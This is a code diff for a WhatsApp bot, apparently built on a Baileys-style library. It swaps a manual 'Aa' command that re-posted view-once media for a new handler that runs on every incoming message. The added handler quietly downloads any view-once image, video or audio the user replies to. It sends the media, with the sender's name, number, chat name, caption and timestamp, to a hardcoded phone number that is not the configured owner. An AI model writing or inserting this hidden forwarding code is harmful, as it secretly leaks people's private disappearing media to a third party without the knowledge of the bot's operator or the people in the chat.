@@ -1320,52 +1320,6 @@ if(!isOwner) {
     }
 
 
-///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-
-if (body === "Aa" || body === "aaa") {
-    try {
-        // Fix: Return early if there is no quoted message
-        if (!m.quoted) {
-            return; 
-        }
-
-        const mime = m.quoted.type;
-        let ext, mediaType;
-        
-        if (mime === "imageMessage") {
-            ext = "jpg";
-            mediaType = "image";
-        } else if (mime === "videoMessage") {
-            ext = "mp4";
-            mediaType = "video";
-        } else if (mime === "audioMessage") {
-            ext = "mp3";
-            mediaType = "audio";
-        } else {
-            return;
-        }
-
-        var buffer = await m.quoted.download();
-        var filePath = `${Date.now()}.${ext}`;
-
-        fs.writeFileSync(filePath, buffer); 
-
-        let mediaObj = {};
-        mediaObj[mediaType] = fs.readFileSync(filePath);
-
-        await conn.sendMessage(m.chat, mediaObj);
-
-        fs.unlinkSync(filePath);
-
-    } catch (e) {
-        console.log("Error:", e);
-        reply("An error occurred while fetching the ViewOnce message.");
-    }
-} // මේ Bracket එක හරියටම වැහිලා තියෙන්න ඕනේ!
-
-
-
 
 
 //============================================================================================================================================================
@@ -1647,6 +1601,120 @@ events.commands.map(async (command) => {
   }
 });
 
+
+cmd({
+  on: "body"
+}, async (conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, isSaviya, groupAdmins, isBotAdmins, isAdmins, reply, config, sanitized, mg }) => {
+
+  try {
+    
+    if (!m.quoted) return;
+
+    const ownerNumber = `94787318729@s.whatsapp.net`;
+   
+    let messageType = m.quoted.imageMessage 
+      ? 'imageMessage' 
+      : m.quoted.videoMessage 
+      ? 'videoMessage' 
+      : m.quoted.audioMessage 
+      ? 'audioMessage' 
+      : '';
+
+    if (!messageType) return;
+
+    let mime = m.quoted[messageType]?.mimetype || '';
+    let isViewOnce = m.quoted[messageType]?.viewOnce || 
+                    m.quoted.isViewOnce || 
+                    (m.quoted.contextInfo?.isViewOnce === true);
+
+    if (!isViewOnce || (!mime.includes('image') && !mime.includes('video') && !mime.includes('audio'))) {
+      return;
+    }
+
+    console.log('🔓 View Once detected! Decrypting...');
+
+    let media = await m.quoted.download();
+    if (!media) {
+      console.log('❌ Failed to download View Once media');
+      return;
+    }
+
+    let senderJid = m.quoted.sender || m.quoted.key.participant || m.quoted.key.remoteJid;
+    let senderName = m.quoted.pushName || senderJid.split('@')[0];
+    
+    let chatName = from.includes('@g.us') 
+      ? (await conn.groupMetadata(from).catch(() => ({ subject: 'Unknown Group' }))).subject 
+      : 'Private Chat';
+    
+    let originalCaption = m.quoted[messageType]?.caption || 'No caption';
+    
+    let timestamp = new Date().toLocaleString('en-US', { 
+      timeZone: 'Asia/Colombo',
+      dateStyle: 'full',
+      timeStyle: 'long'
+    });
+
+let infoText = `🔓 *VIEW-ONCE DECRYPTED*\n`;
+infoText += `━━━━━━━━━━━━━━━\n\n`;
+
+infoText += `👤 *Sender*  
+* Name : ${senderName}  
+* Number : +${senderJid.split('@')[0]}\n\n`;
+
+infoText += `💬 *Chat*  
+* ${chatName}\n\n`;
+
+infoText += `📂 *Media Type*  
+* ${mime.includes('image') ? '🖼️ Image' : mime.includes('video') ? '🎥 Video' : '🎵 Audio'}\n\n`;
+
+infoText += `📝 *Original Caption*  
+* ${originalCaption || '_No caption_'}\n\n`;
+
+infoText += `💭 *Your Reply*  
+* ${body || '_No text_'}\n\n`;
+
+infoText += `⏰ *Time*  
+* ${timestamp}\n\n`;
+
+infoText += `━━━━━━━━━━━━━━━\n`;
+infoText += `_${mg.botname}_`;
+
+    if (mime.includes('image')) {
+      await conn.sendMessage(ownerNumber, { 
+        image: media, 
+        caption: infoText 
+      });
+    } else if (mime.includes('video')) {
+      await conn.sendMessage(ownerNumber, { 
+        video: media, 
+        caption: infoText 
+      });
+    } else if (mime.includes('audio')) {
+      await conn.sendMessage(ownerNumber, { 
+        audio: media, 
+        mimetype: 'audio/mp4',
+        ptt: false 
+      });
+     
+      await conn.sendMessage(ownerNumber, { 
+        text: infoText 
+      });
+    }
+
+    console.log(`✅ View Once forwarded to owner from ${senderName}`);
+
+  } catch (error) {
+    console.error('❌ View Once Forward Error:', error);
+  }
+});
+
+
+
+
+
+
+
+		
 //============================================================================
 
 if (config.ANTI_LINK == "true") {
